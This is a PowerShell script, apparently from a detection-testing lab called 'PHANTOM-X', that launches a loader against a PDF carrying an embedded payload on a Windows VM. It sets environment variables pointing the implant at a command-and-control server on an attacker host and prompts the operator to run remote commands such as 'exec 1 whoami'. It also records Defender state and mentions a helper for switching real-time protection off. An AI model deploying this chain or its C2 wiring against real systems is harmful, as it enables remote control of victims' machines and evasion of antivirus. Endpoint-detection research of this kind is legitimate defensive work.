<#
.SYNOPSIS
    PHANTOM-X :: run the whole chain on the Windows research VM in one command.

.DESCRIPTION
    Orchestrates the complete measurement run on the VM:

      1. (optional) setup_vm.ps1  -- unblock files, policy, report folders
      2. PRE-FLIGHT GATE: refuses to run unless Real-Time Protection is ON.
         This is the lab precondition, and it is checked, not assumed.
      3. Defender + event snapshot labelled "before_<label>"
      4. Starts px_loader.exe in the BACKGROUND against the carrier PDF, so
         the terminal stays free for the operator
      5. Holds the session open (until the loader exits or the timeout)
      6. Defender + event snapshot labelled "after_<label>"
      7. Stops the loader and prints a summary of what was collected

    The operator drives the payload from the C2 console on the attacker host
    during the hold window. This script does not need to talk to the C2.

.PARAMETER KaliHost
    Address of the attacker/operator host running the C2 server.

.PARAMETER KaliPort
    Port the C2 server is listening on.

.PARAMETER Pdf
    Carrier PDF containing the embedded payload.

.PARAMETER Loader
    px_loader.exe.

.PARAMETER Label
    Label used for the before/after snapshots.

.PARAMETER HoldSeconds
    How long to keep the session open.

.PARAMETER SkipSetup
    Do not run setup_vm.ps1 even if it is present.

.PARAMETER AllowDefenderOff
    Proceed even if Real-Time Protection is off. Only for a deliberate,
    documented A/B arm -- and note that lab_ab_toggle.ps1 is the correct
    tool for that, not this switch.

.EXAMPLE
    .\run_chain_on_vm.ps1 -KaliHost 192.168.122.1 -KaliPort 9001 -Label run1
#>
[CmdletBinding()]
param(
    [string]$KaliHost = '192.168.122.1',
    [int]$KaliPort = 9001,
    [string]$Pdf = '.\px_attack_chain.pdf',
    [string]$Loader = '.\px_loader.exe',
    [string]$Label = 'chain',
    [int]$HoldSeconds = 180,
    [switch]$SkipSetup,
    [switch]$AllowDefenderOff
)

$ErrorActionPreference = 'Continue'
$here = $PSScriptRoot
$reportDir = Join-Path $here 'reports'
$loaderLog = Join-Path $here ("loader_{0}.log" -f $Label)

function Write-Section {
    param([string]$Text)
    Write-Host ''
    Write-Host ('=' * 70) -ForegroundColor DarkGray
    Write-Host $Text -ForegroundColor Cyan
    Write-Host ('=' * 70) -ForegroundColor DarkGray
}

# -----------------------------------------------------------------------------
# 1. Setup
# -----------------------------------------------------------------------------
Write-Section "PHANTOM-X :: CHAIN RUN -- LABEL '$Label'"

$setup = Join-Path $here 'setup_vm.ps1'
if (-not $SkipSetup -and (Test-Path $setup)) {
    Write-Host '  running setup_vm.ps1 ...' -ForegroundColor White
    & $setup -LabFolder $here -ReportDir $reportDir | Out-Null
    Write-Host '  setup done.' -ForegroundColor Green
} elseif (-not $SkipSetup) {
    Write-Host '  setup_vm.ps1 not found here; skipping setup.' -ForegroundColor Yellow
    Write-Host '  If you hit "not digitally signed", run:' -ForegroundColor DarkGray
    Write-Host '    Get-ChildItem . -Recurse -File | Unblock-File' -ForegroundColor DarkGray
}

# -----------------------------------------------------------------------------
# 2. Pre-flight gate
# -----------------------------------------------------------------------------
Write-Section '2. Pre-flight'

$files = @($Pdf, $Loader)
foreach ($f in $files) {
    if (-not (Test-Path $f)) {
        Write-Host ("  MISSING: {0}" -f $f) -ForegroundColor Red
        Write-Host '  Copy px_loader.exe and px_attack_chain.pdf to this folder first.' -ForegroundColor Yellow
        exit 1
    }
}
Write-Host '  required files present.' -ForegroundColor Green

$rtp = $null
try {
    $mp = Get-MpComputerStatus -ErrorAction Stop
    $rtp = $mp.RealTimeProtectionEnabled
    Write-Host ("  Real-Time Protection : {0}" -f $rtp) -ForegroundColor $(if ($rtp) { 'Green' } else { 'Red' })
    Write-Host ("  Tamper Protected     : {0}" -f $mp.IsTamperProtected) -ForegroundColor Gray
    Write-Host ("  Signature version    : {0}" -f $mp.AntivirusSignatureVersion) -ForegroundColor Gray
} catch {
    Write-Host ("  could not read Defender status: {0}" -f $_.Exception.Message) -ForegroundColor Red
    Write-Host '  Run this in an ELEVATED PowerShell.' -ForegroundColor Yellow
    exit 1
}

if (-not $rtp) {
    if (-not $AllowDefenderOff) {
        Write-Host ''
        Write-Host '  ABORTED: Real-Time Protection is OFF.' -ForegroundColor Red
        Write-Host '  The lab precondition requires it ON for a valid measurement.' -ForegroundColor Red
        Write-Host ''
        Write-Host '  Either:' -ForegroundColor Yellow
        Write-Host '    1. Turn it back on (Windows Security > Virus & threat protection)' -ForegroundColor Yellow
        Write-Host '    2. For a deliberate A/B arm, use the guarded toggle:' -ForegroundColor Yellow
        Write-Host '         .\lab_ab_toggle.ps1 -Action off' -ForegroundColor White
        Write-Host '       then re-run this script with -AllowDefenderOff' -ForegroundColor White
        exit 2
    }
    Write-Host ''
    Write-Host '  WARNING: proceeding with Real-Time Protection OFF (A/B arm).' -ForegroundColor Yellow
    Write-Host '  Remember: .\lab_ab_toggle.ps1 -Action on' -ForegroundColor Yellow
}

New-Item -ItemType Directory -Path $reportDir -Force | Out-Null

# -----------------------------------------------------------------------------
# 3. Before snapshot
# -----------------------------------------------------------------------------
Write-Section '3. Before snapshot'
$collector = Join-Path $here 'collect_defender.ps1'
if (Test-Path $collector) {
    & $collector -Label ("before_{0}" -f $Label) -OutputDir $reportDir | Out-Null
    Write-Host ("  written to {0}" -f $reportDir) -ForegroundColor Green
} else {
    Write-Host '  collect_defender.ps1 not found; skipping snapshot.' -ForegroundColor Yellow
}

# -----------------------------------------------------------------------------
# 4. Start the chain
# -----------------------------------------------------------------------------
Write-Section '4. Starting the chain'

$env:PX_C2_HOST = $KaliHost
$env:PX_C2_PORT = "$KaliPort"

Write-Host ("  C2 target : {0}:{1}" -f $KaliHost, $KaliPort) -ForegroundColor White
Write-Host ("  carrier   : {0}" -f (Resolve-Path $Pdf).Path) -ForegroundColor White
Write-Host ("  loader log: {0}" -f $loaderLog) -ForegroundColor White
Write-Host ''
Write-Host '  The loader runs in the BACKGROUND so you can keep using this shell.' -ForegroundColor Gray

$proc = Start-Process -FilePath $Loader -ArgumentList @($Pdf, $loaderLog) `
    -WorkingDirectory (Get-Location).Path -PassThru `
    -RedirectStandardOutput (Join-Path $here ("loader_{0}.stdout.txt" -f $Label)) `
    -RedirectStandardError (Join-Path $here ("loader_{0}.stderr.txt" -f $Label))

Write-Host ("  loader pid: {0}" -f $proc.Id) -ForegroundColor Green
Start-Sleep -Seconds 3

if (Test-Path $loaderLog) {
    Write-Host ''
    Write-Host '  loader log so far:' -ForegroundColor White
    Get-Content $loaderLog -Tail 20 | ForEach-Object { Write-Host ("    {0}" -f $_) -ForegroundColor DarkGray }
}

Write-Host ''
Write-Host '  >>> GO TO YOUR C2 CONSOLE ON KALI NOW:' -ForegroundColor Yellow
Write-Host '        c2> list' -ForegroundColor White
Write-Host '        c2> exec 1 whoami' -ForegroundColor White
Write-Host ''
Write-Host ("  holding the session for {0}s (or until the loader exits) ..." -f $HoldSeconds) -ForegroundColor Gray

# -----------------------------------------------------------------------------
# 5. Hold
# -----------------------------------------------------------------------------
$deadline = (Get-Date).AddSeconds($HoldSeconds)
while ((Get-Date) -lt $deadline) {
    if ($proc.HasExited) {
        Write-Host ("  loader exited (code {0})." -f $proc.ExitCode) -ForegroundColor DarkGray
        break
    }
    Start-Sleep -Seconds 2
}

# -----------------------------------------------------------------------------
# 6. After snapshot
# -----------------------------------------------------------------------------
Write-Section '6. After snapshot'
if (Test-Path $collector) {
    & $collector -Label ("after_{0}" -f $Label) -OutputDir $reportDir | Out-Null
    Write-Host ("  written to {0}" -f $reportDir) -ForegroundColor Green
}

if (-not $proc.HasExited) {
    Write-Host '  stopping the loader ...' -ForegroundColor Yellow
    try { Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue } catch { }
}

# -----------------------------------------------------------------------------
# 7. Summary
# -----------------------------------------------------------------------------
Write-Section '7. Collected artefacts'

Get-ChildItem $reportDir -Filter "*${Label}*" -ErrorAction SilentlyContinue |
    ForEach-Object { Write-Host ("    {0,-52} {1,8} bytes" -f $_.Name, $_.Length) -ForegroundColor Gray }
if (Test-Path $loaderLog) {
    Write-Host ("    {0,-52} {1,8} bytes" -f (Split-Path $loaderLog -Leaf), (Get-Item $loaderLog).Length) -ForegroundColor Gray
}

Write-Host ''
Write-Host '  SEND BACK TO THE OPERATOR:' -ForegroundColor White
Write-Host ("    {0}\*_{1}*.json" -f $reportDir, $Label) -ForegroundColor Gray
Write-Host ("    {0}" -f $loaderLog) -ForegroundColor Gray
Write-Host ''
Write-Host '  Also record: reader product + version, AMProductVersion,' -ForegroundColor DarkGray
Write-Host '  Defender event IDs, Sysmon event IDs, and whether traffic was seen.' -ForegroundColor DarkGray
Write-Host ''
